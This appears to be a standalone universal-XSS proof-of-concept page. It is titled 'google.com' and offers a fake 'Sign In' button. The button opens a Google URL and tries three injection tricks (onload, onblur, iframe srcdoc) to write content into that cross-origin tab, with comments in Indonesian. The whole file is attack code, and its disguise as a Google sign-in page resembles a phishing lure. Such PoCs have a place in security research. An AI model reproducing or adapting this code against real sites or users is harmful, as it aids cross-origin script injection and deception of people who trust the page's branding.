<!DOCTYPE html>
<html>
<head><title>google.com</title></head>
<body>
<button onclick="go()">Sign In</button>

<script>
function go() {
  const tab = window.open("https://www.google.com/csi", "_blank");
  
  if (!tab) { alert("Blocked!"); return; }

  // Cara 1 - pakai onload event
  tab.onload = function() {
    try {
      tab.document.body.innerHTML = `
        <h1 style="color:red;text-align:center;
                   margin-top:40vh;font-family:Arial;">
          UXSS Confirmed!
        </h1>`;
      console.log('onload inject success!');
    } catch(e) {
      console.warn('onload failed:', e.message);
    }
  };

  // Cara 2 - pakai onblur trick
  window.onblur = function() {
    try {
      tab.document.body.innerHTML = `
        <h1 style="color:red;text-align:center;
                   margin-top:40vh;font-family:Arial;">
          UXSS via onblur!
        </h1>`;
      console.log('onblur inject success!');
    } catch(e) {
      console.warn('onblur failed:', e.message);
    }
  };

  // Cara 3 - pakai iframe trick
  setTimeout(() => {
    try {
      const iframe = tab.document.createElement('iframe');
      iframe.src = 'javascript:void(0)';
      iframe.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;';
      iframe.srcdoc = `
        <h1 style="color:red;text-align:center;
                   margin-top:40vh;font-family:Arial;">
          UXSS via iframe srcdoc!
        </h1>`;
      tab.document.body.appendChild(iframe);
      console.log('iframe inject success!');
    } catch(e) {
      console.warn('iframe failed:', e.message);
    }
  }, 100);
}
</script>
</body>
</html>
